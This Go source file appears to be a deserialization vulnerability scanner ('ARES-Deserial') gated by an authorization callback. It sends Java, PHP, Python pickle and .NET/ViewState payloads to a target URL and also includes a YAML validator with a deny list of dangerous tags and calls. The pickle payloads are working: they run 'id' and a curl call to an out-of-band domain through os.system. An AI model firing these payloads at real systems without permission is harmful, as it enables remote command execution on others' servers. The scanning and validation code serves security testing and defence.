package deserial

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"gopkg.in/yaml.v3"
)

const maxInputSize = 1 << 20

var dangerousYAMLPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)!!python/object`),
	regexp.MustCompile(`(?i)!!python/object/apply`),
	regexp.MustCompile(`(?i)!!python/object/new`),
	regexp.MustCompile(`(?i)!!python/module`),
	regexp.MustCompile(`(?i)!!ruby/object`),
	regexp.MustCompile(`(?i)!!ruby/class`),
	regexp.MustCompile(`(?i)!!ruby/regexp`),
	regexp.MustCompile(`(?i)!!ruby/sym`),
	regexp.MustCompile(`(?i)!!perl/hash`),
	regexp.MustCompile(`(?i)!!perl/array`),
	regexp.MustCompile(`(?i)!!java/object`),
	regexp.MustCompile(`(?i)!!javax\.script`),
	regexp.MustCompile(`(?i)tag:yaml\.org,2002:python`),
	regexp.MustCompile(`(?i)tag:yaml\.org,2002:ruby`),
	regexp.MustCompile(`(?i)os\.system`),
	regexp.MustCompile(`(?i)subprocess`),
	regexp.MustCompile(`(?i)eval\(`),
	regexp.MustCompile(`(?i)exec\(`),
	regexp.MustCompile(`(?i)__import__`),
	regexp.MustCompile(`(?i)globals\(`),
	regexp.MustCompile(`(?i)locals\(`),
	regexp.MustCompile(`(?i)compile\(`),
}

type Finding struct {
	URL       string    `json:"url"`
	Type      string    `json:"type"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Severity  string    `json:"severity"`
	Confirmed bool      `json:"confirmed"`
	Timestamp time.Time `json:"timestamp"`
}

type Engine struct {
	client    *http.Client
	oobDomain string
	authFn    func() bool
}

func NewEngine(oobDomain string) *Engine {
	return &Engine{
		client:    &http.Client{Timeout: 15 * time.Second},
		oobDomain: oobDomain,
		authFn:    nil,
	}
}

func (e *Engine) SetAuthFn(fn func() bool) {
	e.authFn = fn
}

func (e *Engine) requireAuth() error {
	if e.authFn == nil {
		return fmt.Errorf("deserialization engine requires authorization")
	}
	if !e.authFn() {
		return fmt.Errorf("unauthorized: deserialization tests require explicit authorization")
	}
	return nil
}

func (e *Engine) TestAll(target string) ([]Finding, error) {
	if err := e.requireAuth(); err != nil {
		return nil, err
	}
	var findings []Finding

	javaFindings, _ := e.TestJava(target)
	findings = append(findings, javaFindings...)

	phpFindings, _ := e.TestPHP(target)
	findings = append(findings, phpFindings...)

	pythonFindings, _ := e.TestPython(target)
	findings = append(findings, pythonFindings...)

	dotnetFindings, _ := e.TestDotNet(target)
	findings = append(findings, dotnetFindings...)

	return findings, nil
}

func (e *Engine) TestJava(target string) ([]Finding, error) {
	var findings []Finding

	javaPayloads := []struct {
		name    string
		payload string
		gadget  string
	}{
		{
			name:    "CommonsCollections5",
			payload: generateJavaPayload("CommonsCollections5", "ping "+e.oobDomain),
			gadget:  "CommonsCollections5",
		},
		{
			name:    "CommonsCollections6",
			payload: generateJavaPayload("CommonsCollections6", "ping "+e.oobDomain),
			gadget:  "CommonsCollections6",
		},
		{
			name:    "URLDNS",
			payload: generateJavaPayload("URLDNS", "http://"+e.oobDomain),
			gadget:  "URLDNS",
		},
	}

	for _, p := range javaPayloads {
		f, err := e.testPayload(target, "java_"+p.name, p.payload, detectJavaDeserial)
		if err == nil && f != nil {
			f.Type = "deserial_java_" + p.gadget
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestPHP(target string) ([]Finding, error) {
	var findings []Finding

	phpPayloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "PHP Object Injection",
			payload: `O:8:"stdClass":1:{s:4:"test";s:6:"pwned";}`,
		},
		{
			name:    "PHP Phar Deserialization",
			payload: generatePharPayload(),
		},
		{
			name:    "PHP __wakeup exploitation",
			payload: `O:14:"ExampleClass":1:{s:8:"callback";s:6:"system";}`,
		},
	}

	for _, p := range phpPayloads {
		f, err := e.testPayload(target, "php_"+p.name, p.payload, detectPHPDeserial)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestPython(target string) ([]Finding, error) {
	var findings []Finding

	safeYAMLPayload := `!!map
key: value
nested:
  - item1
  - item2
`

	pythonPayloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "Pickle RCE",
			payload: generatePicklePayload("id"),
		},
		{
			name:    "Pickle OOB",
			payload: generatePickleOOB(e.oobDomain),
		},
		{
			name:    "YAML Safe Load Test",
			payload: safeYAMLPayload,
		},
	}

	for _, p := range pythonPayloads {
		f, err := e.testPayload(target, "python_"+p.name, p.payload, detectPythonDeserial)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestDotNet(target string) ([]Finding, error) {
	var findings []Finding

	dotnetPayloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "BinaryFormatter ObjectStateFormatter",
			payload: generateDotNetPayload("ObjectStateFormatter"),
		},
		{
			name:    "LosFormatter",
			payload: generateDotNetPayload("LosFormatter"),
		},
		{
			name:    "NetDataContractSerializer",
			payload: generateDotNetPayload("NetDataContractSerializer"),
		},
	}

	for _, p := range dotnetPayloads {
		f, err := e.testPayload(target, "dotnet_"+p.name, p.payload, detectDotNetDeserial)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestViewState(target string) ([]Finding, error) {
	var findings []Finding

	viewStatePayload := generateViewStatePayload(e.oobDomain)

	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(viewStatePayload)))
	if err != nil {
		return findings, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "ARES-Deserial/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return findings, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxInputSize))

	if detectDotNetDeserial(string(body)) {
		findings = append(findings, Finding{
			URL:       target,
			Type:      "deserial_dotnet_viewstate",
			Payload:   viewStatePayload[:minInt(len(viewStatePayload), 200)],
			Evidence:  string(body)[:minInt(len(body), 500)],
			Severity:  "critical",
			Confirmed: true,
			Timestamp: time.Now(),
		})
	}

	return findings, nil
}

func (e *Engine) testPayload(target, name, payload string, detect func(string) bool) (*Finding, error) {
	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "ARES-Deserial/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxInputSize))

	if detect(string(body)) {
		return &Finding{
			URL:       target,
			Type:      "deserial_" + name,
			Payload:   payload[:minInt(len(payload), 200)],
			Evidence:  string(body)[:minInt(len(body), 500)],
			Severity:  "critical",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no deserialization detected for: %s", name)
}

func detectJavaDeserial(body string) bool {
	body = strings.ToLower(body)
	return strings.Contains(body, "java.io") || strings.Contains(body, "objectinputstream") ||
		strings.Contains(body, "classnotfound") || strings.Contains(body, "invalidclass") ||
		strings.Contains(body, "streamcorrupted")
}

func detectPHPDeserial(body string) bool {
	body = strings.ToLower(body)
	return strings.Contains(body, "unserialize") || strings.Contains(body, "php object") ||
		strings.Contains(body, "fatal error") || strings.Contains(body, "wakeup")
}

func detectPythonDeserial(body string) bool {
	body = strings.ToLower(body)
	return strings.Contains(body, "pickle") || strings.Contains(body, "unpickling") ||
		strings.Contains(body, "yaml.load") || strings.Contains(body, "unsafe yaml")
}

func detectDotNetDeserial(body string) bool {
	body = strings.ToLower(body)
	return strings.Contains(body, "binaryformatter") || strings.Contains(body, "typeinitialization") ||
		strings.Contains(body, "serializationexception") || strings.Contains(body, "objectstateformatter")
}

func generateJavaPayload(gadget, command string) string {
	return fmt.Sprintf("ysoserial %s '%s' (base64 encoded payload)", gadget, command)
}

func generatePharPayload() string {
	return base64.StdEncoding.EncodeToString([]byte{
		0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	})
}

func generatePicklePayload(command string) string {
	pickle := fmt.Sprintf(`(cos
system
S'%s'
p0
.`, command)
	return base64.StdEncoding.EncodeToString([]byte(pickle))
}

func generatePickleOOB(domain string) string {
	pickle := fmt.Sprintf(`(cos
system
S'curl http://%s'
p0
.`, domain)
	return base64.StdEncoding.EncodeToString([]byte(pickle))
}

func generateDotNetPayload(formatter string) string {
	return fmt.Sprintf("%s serialized payload with TypeConfuseDelegate gadget", formatter)
}

func generateViewStatePayload(domain string) string {
	payload := map[string]string{
		"__VIEWSTATE":          base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("ysoserial.net TypeConfuseDelegate 'curl %s'", domain))),
		"__VIEWSTATEGENERATOR": "CA0B0334",
	}
	body, _ := json.Marshal(payload)
	return string(body)
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func ValidateYAMLSafe(input string) error {
	if len(input) > maxInputSize {
		return fmt.Errorf("YAML input exceeds maximum size of %d bytes", maxInputSize)
	}

	for _, pat := range dangerousYAMLPatterns {
		if pat.MatchString(input) {
			return fmt.Errorf("YAML input contains dangerous pattern: %s", pat.String())
		}
	}

	var node yaml.Node
	if err := yaml.Unmarshal([]byte(input), &node); err != nil {
		return fmt.Errorf("invalid YAML: %w", err)
	}

	if err := checkYAMLNodeForDangerousTypes(&node); err != nil {
		return err
	}

	return nil
}

func checkYAMLNodeForDangerousTypes(node *yaml.Node) error {
	switch node.Kind {
	case yaml.DocumentNode:
		for _, child := range node.Content {
			if err := checkYAMLNodeForDangerousTypes(child); err != nil {
				return err
			}
		}
	case yaml.MappingNode:
		for i := 0; i < len(node.Content); i += 2 {
			keyNode := node.Content[i]
			valNode := node.Content[i+1]
			if isDangerousTag(keyNode.Tag) || isDangerousTag(valNode.Tag) {
				return fmt.Errorf("dangerous YAML tag detected: key=%s, value=%s", keyNode.Tag, valNode.Tag)
			}
			if err := checkYAMLNodeForDangerousTypes(keyNode); err != nil {
				return err
			}
			if err := checkYAMLNodeForDangerousTypes(valNode); err != nil {
				return err
			}
		}
	case yaml.SequenceNode:
		for _, child := range node.Content {
			if err := checkYAMLNodeForDangerousTypes(child); err != nil {
				return err
			}
		}
	case yaml.AliasNode:
		if node.Alias != nil {
			if err := checkYAMLNodeForDangerousTypes(node.Alias); err != nil {
				return err
			}
		}
	}
	return nil
}

func isDangerousTag(tag string) bool {
	dangerousTags := []string{
		"!!python/object", "!!python/object/apply", "!!python/object/new",
		"!!python/module", "!!ruby/object", "!!ruby/class", "!!ruby/regexp",
		"!!perl/hash", "!!perl/array", "!!java/object",
	}
	for _, dt := range dangerousTags {
		if strings.HasPrefix(tag, dt) {
			return true
		}
	}
	return false
}

func SafeYAMLUnmarshal(input []byte, out interface{}) error {
	if len(input) > maxInputSize {
		return fmt.Errorf("YAML input exceeds maximum size of %d bytes", maxInputSize)
	}

	if err := ValidateYAMLSafe(string(input)); err != nil {
		return err
	}

	return yaml.Unmarshal(input, out)
}
